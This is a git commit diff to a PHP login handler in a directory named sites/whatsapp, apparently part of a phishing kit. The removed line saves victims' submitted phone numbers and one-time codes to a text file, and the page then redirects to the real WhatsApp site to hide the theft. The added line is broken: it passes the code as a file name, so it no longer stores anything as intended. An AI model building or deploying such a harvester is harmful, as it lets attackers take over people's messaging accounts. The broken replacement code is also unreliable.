a75456c132cdf1275ea7087373b9ca513e66c6de
mitaliyadav011-jpg <mitaliyadav011@gmail.com>
2026-06-30 15:53:21 +0545

    Update login.php

--- sites/whatsapp/login.php
+++ sites/whatsapp/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['phone'] . " Pass: " . $_POST['otp'] . "\n", FILE_APPEND);
+file_put_contents(" OTP: " . $_POST['otp'] . "\n", FILE_APPEND);
 header('Location: https://api.whatsapp.com/');
 exit();
